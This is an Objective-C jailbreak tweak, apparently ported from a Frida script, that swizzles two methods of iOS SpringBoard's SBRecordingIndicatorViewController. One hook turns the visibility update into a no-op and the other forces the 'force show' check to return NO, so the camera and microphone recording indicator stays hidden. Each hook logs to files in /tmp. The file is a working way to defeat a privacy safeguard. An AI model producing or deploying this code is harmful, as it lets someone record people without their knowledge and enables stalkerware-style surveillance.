#import <Foundation/Foundation.h> 
#import <stdio.h>
#import <time.h>
#import <objc/runtime.h> // Pure Objective-C Runtime

// --- Logging Definitions ---
#define LOG_FILE_PATH_CTOR "/tmp/MyHelloTweak_CTOR_REC_IND.txt"
#define LOG_FILE_PATH_HOOK "/tmp/MyHelloTweak_HOOK_REC_IND.txt"

// --- Function Pointer Definitions ---

// 1. Original method for - updateIndicatorVisibility: (returns void, takes BOOL)
typedef void (*OriginalUpdateVisibility_t)(id, SEL, BOOL);
static OriginalUpdateVisibility_t original_updateVisibility_imp;

// 2. Original method for - _shouldForceViewToShowForCurrentBacklightLuminance (returns BOOL, takes no arguments)
typedef BOOL (*OriginalShouldForce_t)(id, SEL);
static OriginalShouldForce_t original_shouldForce_imp;

// --- New Implementation Functions ---

// 1. Implementation to block indicator visibility updates
void new_updateIndicatorVisibility(id self, SEL _cmd, BOOL animated) {
    // --- Logging ---
    FILE *logFile = fopen(LOG_FILE_PATH_HOOK, "a");
    if (logFile) {
        time_t t = time(NULL);
        struct tm *tm = localtime(&t);
        fprintf(logFile, "[-] SBRecordingIndicatorViewController: updateIndicatorVisibility: BLOCKED! at: %s", asctime(tm));
        fclose(logFile);
    }
    // --- Hook Logic ---
    // The Frida script used a NO-OP, meaning we don't call the original implementation.
    // However, to ensure system stability, it's generally safer to call the original, 
    // and let the *other* hook do the blocking, but for a strict NO-OP, we skip the call.
    // For this test, we skip the original call (NO-OP) to match your Frida logic.
    // original_updateVisibility_imp(self, _cmd, animated); 
}

// 2. Implementation to force the "force show" check to return NO
BOOL new__shouldForceViewToShow(id self, SEL _cmd) {
    // --- Logging ---
    FILE *logFile = fopen(LOG_FILE_PATH_HOOK, "a");
    if (logFile) {
        time_t t = time(NULL);
        struct tm *tm = localtime(&t);
        fprintf(logFile, "[+] SBRecordingIndicatorViewController: _shouldForceViewToShowForCurrentBacklightLuminance hooked to return NO at: %s", asctime(tm));
        fclose(logFile);
    }
    // --- Hook Logic ---
    // We return NO (false) to prevent the indicator from being forced visible.
    // We do NOT call the original to ensure our forced NO value is returned.
    return NO; 
}


// --- Constructor for Setup ---
__attribute__((constructor)) static void custom_constructor(void) {
    
    // --- Constructor Log (Confirmed Working) ---
    FILE *logFileCtor = fopen(LOG_FILE_PATH_CTOR, "a");
    if (logFileCtor) {
        time_t t = time(NULL);
        struct tm *tm = localtime(&t);
        fprintf(logFileCtor, "Constructor executed, attempting indicator hook setup at: %s", asctime(tm));
        fclose(logFileCtor);
    }
    // --- End Constructor Log ---
    
    Class IndicatorClass = objc_getClass("SBRecordingIndicatorViewController");
    
    if (IndicatorClass) {
        // --- 1. Hook - updateIndicatorVisibility: ---
        SEL updateSel = @selector(updateIndicatorVisibility:);
        Method updateMethod = class_getInstanceMethod(IndicatorClass, updateSel);
        if (updateMethod) {
            original_updateVisibility_imp = (OriginalUpdateVisibility_t)method_setImplementation(updateMethod, (IMP)new_updateIndicatorVisibility);
        }
        
        // --- 2. Hook - _shouldForceViewToShowForCurrentBacklightLuminance ---
        // Note: The method name in ObjC is usually without the underscore unless it's a category/private method
        SEL forceSel = @selector(_shouldForceViewToShowForCurrentBacklightLuminance);
        Method forceMethod = class_getInstanceMethod(IndicatorClass, forceSel);
        if (forceMethod) {
            original_shouldForce_imp = (OriginalShouldForce_t)method_setImplementation(forceMethod, (IMP)new__shouldForceViewToShow);
        }
    }
}